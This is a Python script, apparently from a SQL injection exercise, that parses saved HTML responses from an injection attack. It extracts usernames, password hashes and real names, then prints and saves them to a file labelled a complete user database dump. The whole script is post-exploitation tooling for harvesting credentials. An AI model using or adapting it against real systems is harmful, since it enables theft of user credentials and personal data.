
import re

# Read the saved HTML responses
files_to_parse = {
    "/tmp/sqli_username_+_password.html": "username_password",
    "/tmp/sqli_first_name_+_last_name.html": "names",
}

print("=" * 100)
print("EXTRACTING ALL USER DATA FROM SQL INJECTION")
print("=" * 100)

all_data = {}

# Extract usernames and passwords
with open("/tmp/sqli_username_+_password.html", "r") as f:
    content = f.read()
    
# Find all <pre> tags with user data
pre_matches = re.findall(r'<pre>ID:.*?<br />First name: ([^<]+)<br />Surname: ([^<]+)</pre>', content)
print(f"\n[+] Found {len(pre_matches)} user records (username + password format)")

users = []
for i, (username, password_hash) in enumerate(pre_matches):
    if username and password_hash:
        users.append({
            'index': i,
            'username': username.strip(),
            'password_hash': password_hash.strip()
        })
        
print(f"[+] Parsed {len(users)} valid user records")

# Extract first and last names
with open("/tmp/sqli_first_name_+_last_name.html", "r") as f:
    content = f.read()
    
name_matches = re.findall(r'<pre>ID:.*?<br />First name: ([^<]+)<br />Surname: ([^<]+)</pre>', content)
print(f"\n[+] Found {len(name_matches)} user records (name format)")

names = []
for i, (first_name, last_name) in enumerate(name_matches):
    if first_name and last_name:
        names.append({
            'index': i,
            'first_name': first_name.strip(),
            'last_name': last_name.strip()
        })

print(f"[+] Parsed {len(names)} valid name records")

# Combine the data
print("\n" + "=" * 100)
print("COMPLETE USER DATABASE DUMP")
print("=" * 100)

for i in range(max(len(users), len(names))):
    print(f"\n[USER #{i+1}]")
    if i < len(names):
        print(f"  First Name:    {names[i]['first_name']}")
        print(f"  Last Name:     {names[i]['last_name']}")
    if i < len(users):
        print(f"  Username:      {users[i]['username']}")
        print(f"  Password Hash: {users[i]['password_hash']}")
    print("-" * 100)

# Also save to a file
print("\n[*] Saving full data to /tmp/extracted_users.txt")
with open("/tmp/extracted_users.txt", "w") as f:
    f.write("=" * 100 + "\n")
    f.write("COMPLETE USER DATABASE DUMP\n")
    f.write("=" * 100 + "\n\n")
    
    for i in range(max(len(users), len(names))):
        f.write(f"\n[USER #{i+1}]\n")
        if i < len(names):
            f.write(f"  First Name:    {names[i]['first_name']}\n")
            f.write(f"  Last Name:     {names[i]['last_name']}\n")
        if i < len(users):
            f.write(f"  Username:      {users[i]['username']}\n")
            f.write(f"  Password Hash: {users[i]['password_hash']}\n")
        f.write("-" * 100 + "\n")

print("\n[+] Data extraction complete!")
print(f"[+] Total users found: {max(len(users), len(names))}")

